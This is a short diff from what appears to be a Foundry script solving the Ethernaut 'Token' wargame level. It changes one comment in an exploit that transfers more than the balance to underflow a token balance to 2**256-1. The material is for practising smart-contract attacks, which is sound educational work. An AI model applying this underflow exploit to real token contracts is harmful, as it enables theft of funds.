@@ -45,7 +45,7 @@ contract TokenSolution is Script, EthernautHelper {
         //         transfer value bigger than account balance to cause overflow;
         token.transfer(receipient, amount + 1);
 
-        // Step 3: Confirm that caller `heroAddress` successfully created excess tokens.
+        // Step 3: Confirm that caller `heroAddress` has successfully obtained excess tokens.
         address heroAddress = vm.addr(heroPrivateKey);
         require(
             token.balanceOf(heroAddress) == 2 ** 256 - 1,
